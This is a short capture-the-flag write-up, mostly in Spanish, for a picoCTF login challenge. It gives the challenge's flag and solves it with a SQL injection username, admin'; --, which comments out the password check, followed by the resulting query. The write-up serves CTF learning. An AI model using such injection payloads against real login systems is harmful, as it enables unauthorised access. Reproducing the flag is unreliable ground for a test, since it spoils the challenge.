## Descripción
Can you login to this website?

Additional details will be available after launching your challenge instance.
Hints:
1. `admin` is the user you want to login as.

## Solución 
~~~
picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}
~~~
## Notas adicionales 

Ingresamos con los siguientes datos:
username: admin'; --
password: as
SQL query: SELECT * FROM users WHERE name='admin'; --' AND password='as'

Una vez dentro tenemos que buscar la bandera con ayuda de inspeccionar pagina, porque esta oculta. 
## Referencias
